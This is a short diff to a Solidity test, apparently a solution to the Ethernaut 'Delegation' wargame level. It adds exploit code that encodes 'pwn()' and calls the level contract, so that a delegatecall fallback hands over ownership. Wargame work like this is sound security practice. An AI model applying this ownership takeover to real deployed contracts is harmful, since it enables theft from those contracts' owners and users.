@@ -34,7 +34,9 @@ contract TestDelegation is BaseTest {
     }
 
     function exploitLevel() internal override {
-        vm.startPrank(player, player);
+        vm.startPrank(player);
+        bytes memory data = abi.encodeWithSignature("pwn()");
+        address(level).call(data);
         vm.stopPrank();
     }
 }
